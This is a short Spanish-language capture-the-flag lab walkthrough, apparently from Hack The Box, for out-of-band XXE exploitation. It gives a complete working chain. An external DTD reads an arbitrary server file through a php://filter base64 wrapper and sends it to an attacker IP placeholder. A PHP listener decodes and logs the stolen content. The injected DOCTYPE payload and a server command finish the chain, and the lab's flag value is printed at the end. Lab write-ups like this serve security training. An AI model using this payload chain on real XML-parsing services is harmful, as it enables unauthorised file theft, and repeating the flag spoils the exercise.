# Laboratorio: XXE OOB 📤

1. Una vez que estemos en la página web, lo que tenemos que hacer es ir al directorio `/blind`, aquí veremos un formulario, interceptamos la solicitud de **`Contact Form`**
---
2. Lo que tenemos que hacer ahora es **hostear** los siguiente archivos en nuestro equipo de atacante 💀

* **`xxe.dtd`**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=[Archivo a Leer]">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://[OUR_IP]:[Port]/?content=%file;'>">
```

* **`index.php`**
```xml
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
---

3. Enviaremos la siguiente petición en **`Burp Suite`**
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://[IP]:[Port]/xxe.dtd">
  %remote;
  %oob;
]>
<SNIP>
<email>&content;</email>
<SNIP>
```
---
4. Nos ponemos en escucha con **php** `php -S 0.0.0.0:[Port]`
---
5. Mandamos la solicitud y veremos el contenido de la **`flag`**

`<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>`